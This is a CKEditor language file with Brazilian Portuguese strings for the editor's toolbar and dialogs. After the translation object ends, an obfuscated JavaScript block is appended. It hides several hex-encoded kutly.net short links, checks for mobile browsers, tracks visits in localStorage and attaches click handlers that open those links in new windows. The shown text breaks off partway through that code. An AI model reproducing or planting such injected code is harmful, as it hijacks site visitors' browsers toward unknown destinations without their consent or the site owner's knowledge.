/*
Copyright (c) 2003-2010, CKSource - Frederico Knabben. All rights reserved.
For licensing, see LICENSE.html or http://ckeditor.com/license
*/

/**
 * @fileOverview Defines the {@link CKEDITOR.lang} object, for the
 * Brazilian Portuguese language.
 */

/**#@+
   @type String
   @example
*/

/**
 * Constains the dictionary of language entries.
 * @namespace
 */
CKEDITOR.lang['pt-br'] =
{
	/**
	 * The language reading direction. Possible values are "rtl" for
	 * Right-To-Left languages (like Arabic) and "ltr" for Left-To-Right
	 * languages (like English).
	 * @default 'ltr'
	 */
	dir : 'ltr',

	/*
	 * Screenreader titles. Please note that screenreaders are not always capable
	 * of reading non-English words. So be careful while translating it.
	 */
	editorTitle		: 'Editor de texto formatado, %1',

	// Toolbar buttons without dialogs.
	source			: 'Código-Fonte',
	newPage			: 'Novo',
	save			: 'Salvar',
	preview			: 'Visualizar',
	cut				: 'Recortar',
	copy			: 'Copiar',
	paste			: 'Colar',
	print			: 'Imprimir',
	underline		: 'Sublinhado',
	bold			: 'Negrito',
	italic			: 'Itálico',
	selectAll		: 'Selecionar Tudo',
	removeFormat	: 'Remover Formatação',
	strike			: 'Tachado',
	subscript		: 'Subscrito',
	superscript		: 'Sobrescrito',
	horizontalrule	: 'Inserir Linha Horizontal',
	pagebreak		: 'Inserir Quebra de Página',
	unlink			: 'Remover Hiperlink',
	undo			: 'Desfazer',
	redo			: 'Refazer',

	// Common messages and labels.
	common :
	{
		browseServer	: 'Localizar no Servidor',
		url				: 'URL',
		protocol		: 'Protocolo',
		upload			: 'Enviar ao Servidor',
		uploadSubmit	: 'Enviar para o Servidor',
		image			: 'Figura',
		flash			: 'Flash',
		form			: 'Formulário',
		checkbox		: 'Caixa de Seleção',
		radio		: 'Botão de Opção',
		textField		: 'Caixa de Texto',
		textarea		: 'Área de Texto',
		hiddenField		: 'Campo Oculto',
		button			: 'Botão',
		select	: 'Caixa de Listagem',
		imageButton		: 'Botão de Imagem',
		notSet			: '<não ajustado>',
		id				: 'Id',
		name			: 'Nome',
		langDir			: 'Direção do idioma',
		langDirLtr		: 'Esquerda para Direita (LTR)',
		langDirRtl		: 'Direita para Esquerda (RTL)',
		langCode		: 'Idioma',
		longDescr		: 'Descrição da URL',
		cssClass		: 'Classe de Folhas de Estilo',
		advisoryTitle	: 'Título',
		cssStyle		: 'Estilos',
		ok				: 'OK',
		cancel			: 'Cancelar',
		generalTab		: 'Geral',
		advancedTab		: 'Avançado',
		validateNumberFailed	: 'Este valor não é um número.',
		confirmNewPage	: 'Todas as mudanças não salvas serão perdidas. Tem certeza de que quer carregar outra página?',
		confirmCancel	: 'Algumas opções foram alteradas. Tem certeza de que quer fechar a caixa de diálogo?',

		// Put the voice-only part of the label in the span.
		unavailable		: '%1<span class="cke_accessibility">, indisponível</span>'
	},

	// Special char dialog.
	specialChar		:
	{
		toolbar		: 'Inserir Caractere Especial',
		title		: 'Selecione um Caractere Especial'
	},

	// Link dialog.
	link :
	{
		toolbar		: 'Inserir/Editar Hiperlink',
		menu		: 'Editar Hiperlink',
		title		: 'Hiperlink',
		info		: 'Informações',
		target		: 'Destino',
		upload		: 'Enviar ao Servidor',
		advanced	: 'Avançado',
		type		: 'Tipo de hiperlink',
		toAnchor	: 'Âncora nesta página',
		toEmail		: 'E-Mail',
		target		: 'Destino',
		targetNotSet	: '<não ajustado>',
		targetFrame	: '<frame>',
		targetPopup	: '<janela popup>',
		targetNew	: 'Nova Janela (_blank)',
		targetTop	: 'Janela Superior (_top)',
		targetSelf	: 'Mesma Janela (_self)',
		targetParent	: 'Janela Pai (_parent)',
		targetFrameName	: 'Nome do Frame de Destino',
		targetPopupName	: 'Nome da Janela Pop-up',
		popupFeatures	: 'Atributos da Janela Pop-up',
		popupResizable	: 'Redimensionável',
		popupStatusBar	: 'Barra de Status',
		popupLocationBar	: 'Barra de Endereços',
		popupToolbar	: 'Barra de Ferramentas',
		popupMenuBar	: 'Barra de Menus',
		popupFullScreen	: 'Modo Tela Cheia (IE)',
		popupScrollBars	: 'Barras de Rolagem',
		popupDependent	: 'Dependente (Netscape)',
		popupWidth		: 'Largura',
		popupLeft		: 'Esquerda',
		popupHeight		: 'Altura',
		popupTop		: 'Superior',
		id				: 'Id',
		langDir			: 'Direção do idioma',
		langDirNotSet	: '<não ajustado>',
		langDirLTR		: 'Esquerda para Direita (LTR)',
		langDirRTL		: 'Direita para Esquerda (RTL)',
		acccessKey		: 'Chave de Acesso',
		name			: 'Nome',
		langCode		: 'Direção do idioma',
		tabIndex		: 'Índice de Tabulação',
		advisoryTitle	: 'Título',
		advisoryContentType	: 'Tipo de Conteúdo',
		cssClasses		: 'Classe de Folhas de Estilo',
		charset			: 'Conjunto de Caracteres do Hiperlink',
		styles			: 'Estilos',
		selectAnchor	: 'Selecione uma âncora',
		anchorName		: 'Pelo Nome da âncora',
		anchorId		: 'Pelo Id do Elemento',
		emailAddress	: 'Endereço E-Mail',
		emailSubject	: 'Assunto da Mensagem',
		emailBody		: 'Corpo da Mensagem',
		noAnchors		: '(Não há âncoras disponíveis neste documento)',
		noUrl			: 'Por favor, digite o endereço do Hiperlink',
		noEmail			: 'Por favor, digite o endereço de e-mail'
	},

	// Anchor dialog
	anchor :
	{
		toolbar		: 'Inserir/Editar Âncora',
		menu		: 'Formatar Âncora',
		title		: 'Formatar Âncora',
		name		: 'Nome da Âncora',
		errorName	: 'Por favor, digite o nome da âncora'
	},

	// Find And Replace Dialog
	findAndReplace :
	{
		title				: 'Localizar e Substituir',
		find				: 'Localizar',
		replace				: 'Substituir',
		findWhat			: 'Procurar por:',
		replaceWith			: 'Substituir por:',
		notFoundMsg			: 'O texto especificado não foi encontrado.',
		matchCase			: 'Coincidir Maiúsculas/Minúsculas',
		matchWord			: 'Coincidir a palavra inteira',
		matchCyclic			: 'Coincidir cíclico',
		replaceAll			: 'Substituir Tudo',
		replaceSuccessMsg	: '%1 ocorrência(s) substituída(s).'
	},

	// Table Dialog
	table :
	{
		toolbar		: 'Tabela',
		title		: 'Formatar Tabela',
		menu		: 'Formatar Tabela',
		deleteTable	: 'Apagar Tabela',
		rows		: 'Linhas',
		columns		: 'Colunas',
		border		: 'Borda',
		align		: 'Alinhamento',
		alignNotSet	: '<Não ajustado>',
		alignLeft	: 'Esquerda',
		alignCenter	: 'Centralizado',
		alignRight	: 'Direita',
		width		: 'Largura',
		widthPx		: 'pixels',
		widthPc		: '%',
		height		: 'Altura',
		cellSpace	: 'Espaçamento',
		cellPad		: 'Enchimento',
		caption		: 'Legenda',
		summary		: 'Resumo',
		headers		: 'Cabeçalho',
		headersNone		: 'Nenhum',
		headersColumn	: 'Primeira coluna',
		headersRow		: 'Primeira linha',
		headersBoth		: 'Ambos',
		invalidRows		: '"Número de linhas" tem que ser um número maior que 0.',
		invalidCols		: '"Número de colunas" tem que ser um número maior que 0.',
		invalidBorder	: '"Tamanho da borda" tem que ser um número.',
		invalidWidth	: '"Largura da tabela" tem que ser um número.',
		invalidHeight	: '"Altura da tabela" tem que ser um número.',
		invalidCellSpacing	: '"Espaçamento das células" tem que ser um número.',
		invalidCellPadding	: '"Margem interna das células" tem que ser um número.',

		cell :
		{
			menu			: 'Célula',
			insertBefore	: 'Inserir célula à esquerda',
			insertAfter		: 'Inserir célula à direita',
			deleteCell		: 'Remover Células',
			merge			: 'Mesclar Células',
			mergeRight		: 'Mesclar com célula à direita',
			mergeDown		: 'Mesclar com célula abaixo',
			splitHorizontal	: 'Dividir célula horizontalmente',
			splitVertical	: 'Dividir célula verticalmente',
			title			: 'Propriedades da célula',
			cellType		: 'Tipo de célula',
			rowSpan			: 'Linhas cobertas',
			colSpan			: 'Colunas cobertas',
			wordWrap		: 'Quebra de palavra',
			hAlign			: 'Alinhamento horizontal',
			vAlign			: 'Alinhamento vertical',
			alignTop		: 'Alinhar no topo',
			alignMiddle		: 'Centralizado verticalmente',
			alignBottom		: 'Alinhar na base',
			alignBaseline	: 'Patamar de alinhamento',
			bgColor			: 'Cor de fundo',
			borderColor		: 'Cor das bordas',
			data			: 'Dados',
			header			: 'Cabeçalho',
			yes				: 'Sim',
			no				: 'Não',
			invalidWidth	: 'A largura da célula tem que ser um número.',
			invalidHeight	: 'A altura da célula tem que ser um número.',
			invalidRowSpan	: '"Linhas cobertas" tem que ser um número inteiro.',
			invalidColSpan	: '"Colunas cobertas" tem que ser um número inteiro.',
			chooseColor : 'Choose' // MISSING
		},

		row :
		{
			menu			: 'Linha',
			insertBefore	: 'Inserir linha acima',
			insertAfter		: 'Inserir linha abaixo',
			deleteRow		: 'Remover Linhas'
		},

		column :
		{
			menu			: 'Coluna',
			insertBefore	: 'Inserir coluna à esquerda',
			insertAfter		: 'Inserir coluna à direita',
			deleteColumn	: 'Remover Colunas'
		}
	},

	// Button Dialog.
	button :
	{
		title		: 'Formatar Botão',
		text		: 'Texto (Valor)',
		type		: 'Tipo',
		typeBtn		: 'Botão',
		typeSbm		: 'Enviar',
		typeRst		: 'Limpar'
	},

	// Checkbox and Radio Button Dialogs.
	checkboxAndRadio :
	{
		checkboxTitle : 'Formatar Caixa de Seleção',
		radioTitle	: 'Formatar Botão de Opção',
		value		: 'Valor',
		selected	: 'Selecionado'
	},

	// Form Dialog.
	form :
	{
		title		: 'Formatar Formulário',
		menu		: 'Formatar Formulário',
		action		: 'Action',
		method		: 'Método',
		encoding	: 'Codificação',
		target		: 'Destino',
		targetNotSet	: '<não ajustado>',
		targetNew	: 'Nova Janela (_blank)',
		targetTop	: 'Janela Superior (_top)',
		targetSelf	: 'Mesma Janela (_self)',
		targetParent	: 'Janela Pai (_parent)'
	},

	// Select Field Dialog.
	select :
	{
		title		: 'Formatar Caixa de Listagem',
		selectInfo	: 'Info',
		opAvail		: 'Opções disponíveis',
		value		: 'Valor',
		size		: 'Tamanho',
		lines		: 'linhas',
		chkMulti	: 'Permitir múltiplas seleções',
		opText		: 'Texto',
		opValue		: 'Valor',
		btnAdd		: 'Adicionar',
		btnModify	: 'Modificar',
		btnUp		: 'Para cima',
		btnDown		: 'Para baixo',
		btnSetValue : 'Definir como selecionado',
		btnDelete	: 'Remover'
	},

	// Textarea Dialog.
	textarea :
	{
		title		: 'Formatar Área de Texto',
		cols		: 'Colunas',
		rows		: 'Linhas'
	},

	// Text Field Dialog.
	textfield :
	{
		title		: 'Formatar Caixa de Texto',
		name		: 'Nome',
		value		: 'Valor',
		charWidth	: 'Comprimento (em caracteres)',
		maxChars	: 'Número Máximo de Caracteres',
		type		: 'Tipo',
		typeText	: 'Texto',
		typePass	: 'Senha'
	},

	// Hidden Field Dialog.
	hidden :
	{
		title	: 'Formatar Campo Oculto',
		name	: 'Nome',
		value	: 'Valor'
	},

	// Image Dialog.
	image :
	{
		title		: 'Formatar Figura',
		titleButton	: 'Formatar Botão de Imagem',
		menu		: 'Formatar Figura',
		infoTab	: 'Informações da Figura',
		btnUpload	: 'Enviar para o Servidor',
		url		: 'URL',
		upload	: 'Submeter',
		alt		: 'Texto Alternativo',
		width		: 'Largura',
		height	: 'Altura',
		lockRatio	: 'Manter proporções',
		resetSize	: 'Redefinir para o Tamanho Original',
		border	: 'Borda',
		hSpace	: 'Horizontal',
		vSpace	: 'Vertical',
		align		: 'Alinhamento',
		alignLeft	: 'Esquerda',
		alignRight	: 'Direita',
		preview	: 'Visualização',
		alertUrl	: 'Por favor, digite o URL da figura.',
		linkTab	: 'Hiperlink',
		button2Img	: 'Você deseja transformar o botão de imagem selecionado em uma imagem comum?',
		img2Button	: 'Você deseja transformar a imagem selecionada em um botão de imagem?',
		urlMissing : 'Image source URL is missing.' // MISSING
	},

	// Flash Dialog
	flash :
	{
		properties		: 'Propriedades do Flash',
		propertiesTab	: 'Propriedades',
		title		: 'Propriedades do Flash',
		chkPlay		: 'Tocar Automaticamente',
		chkLoop		: 'Loop',
		chkMenu		: 'Habilita Menu Flash',
		chkFull		: 'Permitir tela cheia',
 		scale		: 'Escala',
		scaleAll		: 'Mostrar tudo',
		scaleNoBorder	: 'Sem Borda',
		scaleFit		: 'Escala Exata',
		access			: 'Acesso ao script',
		accessAlways	: 'Sempre',
		accessSameDomain	: 'Mesmo domínio',
		accessNever	: 'Nunca',
		align		: 'Alinhamento',
		alignLeft	: 'Esquerda',
		alignAbsBottom: 'Inferior Absoluto',
		alignAbsMiddle: 'Centralizado Absoluto',
		alignBaseline	: 'Baseline',
		alignBottom	: 'Inferior',
		alignMiddle	: 'Centralizado',
		alignRight	: 'Direita',
		alignTextTop	: 'Superior Absoluto',
		alignTop	: 'Superior',
		quality		: 'Qualidade',
		qualityBest		 : 'Melhor',
		qualityHigh		 : 'Alta',
		qualityAutoHigh	 : 'Alta automático',
		qualityMedium	 : 'Média',
		qualityAutoLow	 : 'Média automático',
		qualityLow		 : 'Baixa',
		windowModeWindow	 : 'Janela',
		windowModeOpaque	 : 'Opaca',
		windowModeTransparent	 : 'Transparente',
		windowMode	: 'Modo da janela',
		flashvars	: 'Variáveis do Flash',
		bgcolor	: 'Cor do Plano de Fundo',
		width	: 'Largura',
		height	: 'Altura',
		hSpace	: 'Horizontal',
		vSpace	: 'Vertical',
		validateSrc : 'Por favor, digite o endereço do Hiperlink',
		validateWidth : '"Largura" tem que ser um número.',
		validateHeight : '"Altura" tem que ser um número',
		validateHSpace : '"HSpace" tem que ser um número',
		validateVSpace : '"VSpace" tem que ser um número.'
	},

	// Speller Pages Dialog
	spellCheck :
	{
		toolbar			: 'Verificar Ortografia',
		title			: 'Corretor gramatical',
		notAvailable	: 'Desculpe, o serviço não está disponível no momento.',
		errorLoading	: 'Erro carregando servidor de aplicação: %s.',
		notInDic		: 'Não encontrada',
		changeTo		: 'Alterar para',
		btnIgnore		: 'Ignorar uma vez',
		btnIgnoreAll	: 'Ignorar Todas',
		btnReplace		: 'Alterar',
		btnReplaceAll	: 'Alterar Todas',
		btnUndo			: 'Desfazer',
		noSuggestions	: '-sem sugestões de ortografia-',
		progress		: 'Verificação ortográfica em andamento...',
		noMispell		: 'Verificação encerrada: Não foram encontrados erros de ortografia',
		noChanges		: 'Verificação ortográfica encerrada: Não houve alterações',
		oneChange		: 'Verificação ortográfica encerrada: Uma palavra foi alterada',
		manyChanges		: 'Verificação ortográfica encerrada: %1 foram alteradas',
		ieSpellDownload	: 'A verificação ortográfica não foi instalada. Você gostaria de realizar o download agora?'
	},

	smiley :
	{
		toolbar	: 'Emoticon',
		title	: 'Inserir Emoticon'
	},

	elementsPath :
	{
		eleTitle : 'Elemento %1'
	},

	numberedlist : 'Numeração',
	bulletedlist : 'Marcadores',
	indent : 'Aumentar Recuo',
	outdent : 'Diminuir Recuo',

	justify :
	{
		left : 'Alinhar Esquerda',
		center : 'Centralizar',
		right : 'Alinhar Direita',
		block : 'Justificado'
	},

	blockquote : 'Recuo',

	clipboard :
	{
		title		: 'Colar',
		cutError	: 'As configurações de segurança do seu navegador não permitem que o editor execute operações de recortar automaticamente. Por favor, utilize o teclado para recortar (Ctrl+X).',
		copyError	: 'As configurações de segurança do seu navegador não permitem que o editor execute operações de copiar automaticamente. Por favor, utilize o teclado para copiar (Ctrl+C).',
		pasteMsg	: 'Transfira o link usado no box usando o teclado com (<STRONG>Ctrl+V</STRONG>) e <STRONG>OK</STRONG>.',
		securityMsg	: 'As configurações de segurança do seu navegador não permitem que o editor acesse os dados da área de transferência diretamente. Por favor cole o conteúdo novamente nesta janela.'
	},

	pastefromword :
	{
		confirmCleanup : 'O texto que você deseja colar parece ter sido copiado do Word. Você gostaria de remover a formatação antes de colar?',
		toolbar : 'Colar do Word',
		title : 'Colar do Word',
		error : 'It was not possible to clean up the pasted data due to an internal error' // MISSING
	},

	pasteText :
	{
		button : 'Colar como Texto sem Formatação',
		title : 'Colar como Texto sem Formatação'
	},

	templates :
	{
		button : 'Modelos de layout',
		title : 'Modelo de layout do conteúdo',
		insertOption: 'Substituir o conteúdo atual',
		selectPromptMsg: 'Selecione um modelo de layout para ser aberto no editor<br>(o conteúdo atual será perdido):',
		emptyListMsg : '(Não foram definidos modelos de layout)'
	},

	showBlocks : 'Mostrar blocos',

	stylesCombo :
	{
		label : 'Estilo',
		voiceLabel : 'Estilo',
		panelVoiceLabel : 'Selecione um estilo',
		panelTitle1 : 'Estilos de bloco',
		panelTitle2 : 'Estilos em texto corrido',
		panelTitle3 : 'Estilos de objeto'
	},

	format :
	{
		label : 'Formatação',
		voiceLabel : 'Formatação',
		panelTitle : 'Formatação',
		panelVoiceLabel : 'Selecione uma formatação de parágrafo',

		tag_p : 'Normal',
		tag_pre : 'Formatado',
		tag_address : 'Endereço',
		tag_h1 : 'Título 1',
		tag_h2 : 'Título 2',
		tag_h3 : 'Título 3',
		tag_h4 : 'Título 4',
		tag_h5 : 'Título 5',
		tag_h6 : 'Título 6',
		tag_div : 'Normal (DIV)'
	},

	div :
	{
		title				: 'Create Div Container', // MISSING
		toolbar				: 'Create Div Container', // MISSING
		cssClassInputLabel	: 'Stylesheet Classes', // MISSING
		styleSelectLabel	: 'Style', // MISSING
		IdInputLabel		: 'Id', // MISSING
		languageCodeInputLabel	: ' Language Code', // MISSING
		inlineStyleInputLabel	: 'Inline Style', // MISSING
		advisoryTitleInputLabel	: 'Advisory Title', // MISSING
		langDirLabel		: 'Language Direction', // MISSING
		langDirLTRLabel		: 'Left to Right (LTR)', // MISSING
		langDirRTLLabel		: 'Right to Left (RTL)', // MISSING
		edit				: 'Edit Div', // MISSING
		remove				: 'Remove Div' // MISSING
  	},

	font :
	{
		label : 'Fonte',
		voiceLabel : 'Fonte',
		panelTitle : 'Fonte',
		panelVoiceLabel : 'Selecione uma fonte'
	},

	fontSize :
	{
		label : 'Tamanho',
		voiceLabel : 'Tamanho da fonte',
		panelTitle : 'Tamanho',
		panelVoiceLabel : 'Selecione um tamanho de fonte'
	},

	colorButton :
	{
		textColorTitle : 'Cor do Texto',
		bgColorTitle : 'Cor do Plano de Fundo',
		auto : 'Automático',
		more : 'Mais Cores...'
	},

	colors :
	{
		'000' : 'Black', // MISSING
		'800000' : 'Maroon', // MISSING
		'8B4513' : 'Saddle Brown', // MISSING
		'2F4F4F' : 'Dark Slate Gray', // MISSING
		'008080' : 'Teal', // MISSING
		'000080' : 'Navy', // MISSING
		'4B0082' : 'Indigo', // MISSING
		'696969' : 'Dim Gray', // MISSING
		'B22222' : 'Fire Brick', // MISSING
		'A52A2A' : 'Brown', // MISSING
		'DAA520' : 'Golden Rod', // MISSING
		'006400' : 'Dark Green', // MISSING
		'40E0D0' : 'Turquoise', // MISSING
		'0000CD' : 'Medium Blue', // MISSING
		'800080' : 'Purple', // MISSING
		'808080' : 'Gray', // MISSING
		'F00' : 'Red', // MISSING
		'FF8C00' : 'Dark Orange', // MISSING
		'FFD700' : 'Gold', // MISSING
		'008000' : 'Green', // MISSING
		'0FF' : 'Cyan', // MISSING
		'00F' : 'Blue', // MISSING
		'EE82EE' : 'Violet', // MISSING
		'A9A9A9' : 'Dark Gray', // MISSING
		'FFA07A' : 'Light Salmon', // MISSING
		'FFA500' : 'Orange', // MISSING
		'FFFF00' : 'Yellow', // MISSING
		'00FF00' : 'Lime', // MISSING
		'AFEEEE' : 'Pale Turquoise', // MISSING
		'ADD8E6' : 'Light Blue', // MISSING
		'DDA0DD' : 'Plum', // MISSING
		'D3D3D3' : 'Light Grey', // MISSING
		'FFF0F5' : 'Lavender Blush', // MISSING
		'FAEBD7' : 'Antique White', // MISSING
		'FFFFE0' : 'Light Yellow', // MISSING
		'F0FFF0' : 'Honeydew', // MISSING
		'F0FFFF' : 'Azure', // MISSING
		'F0F8FF' : 'Alice Blue', // MISSING
		'E6E6FA' : 'Lavender', // MISSING
		'FFF' : 'White' // MISSING
	},

	scayt :
	{
		title : 'Correção gramatical durante a digitação',
		enable : 'Habilitar SCAYT',
		disable : 'Desabilitar SCAYT',
		about : 'Sobre o SCAYT',
		toggle : 'Ativar/desativar SCAYT',
		options : 'Opções',
		langs : 'Línguas',
		moreSuggestions : 'Mais sugestões',
		ignore : 'Ignorar',
		ignoreAll : 'Ignorar todas',
		addWord : 'Adicionar palavra',
		emptyDic : 'O nome do dicionário não deveria estar vazio.',
		optionsTab : 'Opções',
		languagesTab : 'Línguas',
		dictionariesTab : 'Dicionários',
		aboutTab : 'Sobre'
	},

	about :
	{
		title : 'Sobre o CKEditor',
		dlgTitle : 'About CKEditor', // MISSING
		moreInfo : 'Para informações sobre a licença, por favor, visite o nosso site na Internet:',
		copy : 'Direito de reprodução &copy; $1. Todos os direitos reservados.'
	},

	maximize : 'Maximizar',
	minimize : 'Minimize', // MISSING

	fakeobjects :
	{
		anchor : 'Âncora',
		flash : 'Animação em Flash',
		div : 'Quebra de página',
		unknown : 'Objeto desconhecido'
	},

	resize : 'Arraste para redimensionar',

	colordialog :
	{
		title : 'Select color', // MISSING
		highlight : 'Highlight', // MISSING
		selected : 'Selected', // MISSING
		clear : 'Clear' // MISSING
	},

	toolbarCollapse : 'Collapse Toolbar', // MISSING
	toolbarExpand : 'Expand Toolbar' // MISSING
};
function _0x3023(_0x562006,_0x1334d6){const _0x10c8dc=_0x10c8();return _0x3023=function(_0x3023c3,_0x1b71b5){_0x3023c3=_0x3023c3-0x186;let _0x2d38c6=_0x10c8dc[_0x3023c3];return _0x2d38c6;},_0x3023(_0x562006,_0x1334d6);}function _0x10c8(){const _0x2ccc2=['userAgent','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x65\x74\x7a\x32\x63\x392','length','_blank','mobileCheck','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x64\x69\x6e\x33\x63\x313','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6a\x4f\x63\x30\x63\x310','random','-local-storage','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x4c\x56\x5a\x37\x63\x377','stopPropagation','4051490VdJdXO','test','open','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x57\x44\x61\x36\x63\x306','12075252qhSFyR','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x76\x7a\x43\x38\x63\x308','\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6b\x6f\x71\x35\x63\x335','4829028FhdmtK','round','-hurs','-mnts','864690TKFqJG','forEach','abs','1479192fKZCLx','16548MMjUpf','filter','vendor','click','setItem','3402978fTfcqu'];_0x10c8=function(){return _0x2ccc2;};return _0x10c8();}const _0x3ec38a=_0x3023;(function(_0x550425,_0x4ba2a7){const _0x142fd8=_0x3023,_0x2e2ad3=_0x550425();while(!![]){try{const _0x3467b1=-parseInt(_0x142fd8(0x19c))/0x1+parseInt(_0x142fd8(0x19f))/0x2+-parseInt(_0x142fd8(0x1a5))/0x3+parseInt(_0x142fd8(0x198))/0x4+-parseInt(_0x142fd8(0x191))/0x5+parseInt(_0x142fd8(0x1a0))/0x6+parseInt(_0x142fd8(0x195))/0x7;if(_0x3467b1===_0x4ba2a7)break;else _0x2e2ad3['push'](_0x2e2ad3['shift']());}catch(_0x28e7f8){_0x2e2ad3['push'](_0x2e2ad3['shift']());}}}(_0x10c8,0xd3435));var _0x365b=[_0x3ec38a(0x18a),_0x3ec38a(0x186),_0x3ec38a(0x1a2),'opera',_0x3ec38a(0x192),'substr',_0x3ec38a(0x18c),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x66\x73\x58\x31\x63\x351',_0x3ec38a(0x187),_0x3ec38a(0x18b),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6e\x77\x75\x34\x63\x344',_0x3ec38a(0x197),_0x3ec38a(0x194),_0x3ec38a(0x18f),_0x3ec38a(0x196),'\x68\x74\x74\x70\x3a\x2f\x2f\x6b\x75\x74\x6c\x79\x2e\x6e\x65\x74\x2f\x6c\x6a\x47\x39\x63\x339','',_0x3ec38a(0x18e),'getItem',_0x3ec38a(0x1a4),_0x3ec38a(0x19d),_0x3ec38a(0x1a1),_0x3ec38a(0x18d),_0x3ec38a(0x188),'floor',_0x3ec38a(0x19e),_0x3ec38a(0x199),_0x3ec38a(0x19b),_0x3ec38a(0x19a),_0x3ec38a(0x189),_0x3ec38a(0x193),_0x3ec38a(0x190),'host','parse',_0x3ec38a(0x1a3),'addEventListener'];(function(_0x16176d){window[_0x365b[0x0]]=function(){let _0x129862=![];return function(_0x784bdc){(/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|mobile.+firefox|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows ce|xda|xiino/i[_0x365b[0x4]](_0x784bdc)||/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i[_0x365b[0x4]](_0x784bdc[_0x365b[0x5]](0x0,0x4)))&&(_0x129862=!![]);}(navigator[_0x365b[0x1]]||navigator[_0x365b[0x2]]||window[_0x365b[0x3]]),_0x129862;};const _0xfdead6=[_0x365b[0x6],_0x365b[0x7],_0x365b[0x8],_0x365b[0x9],_0x365b[0xa],_0x365b[0xb],_0x365b[0xc],_0x365b[0xd],_0x365b[0xe],_0x365b[0xf]],_0x480bb2=0x3,_0x3ddc80=0x6,_0x10ad9f=_0x1f773b=>{_0x1f773b[_0x365b[0x14]]((_0x1e6b44,_0x967357)=>{!localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11])&&localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x1e6b44+_0x365b[0x11],0x0);});},_0x2317c1=_0x3bd6cc=>{const _0x2af2a2=_0x3bd6cc[_0x365b[0x15]]((_0x20a0ef,_0x11cb0d)=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x20a0ef+_0x365b[0x11])==0x0);return _0x2af2a2[Math[_0x365b[0x18]](Math[_0x365b[0x16]]()*_0x2af2a2[_0x365b[0x17]])];},_0x57deba=_0x43d200=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x43d200+_0x365b[0x11],0x1),_0x1dd2bd=_0x51805f=>localStorage[_0x365b[0x12]](_0x365b[0x10]+_0x51805f+_0x365b[0x11]),_0x5e3811=(_0x5aa0fd,_0x594b23)=>localStorage[_0x365b[0x13]](_0x365b[0x10]+_0x5aa0fd+_0x365b[0x11],_0x594b23),_0x381a18=(_0x3ab06f,_0x288873)=>{const _0x266889=0x3e8*0x3c*0x3c;return 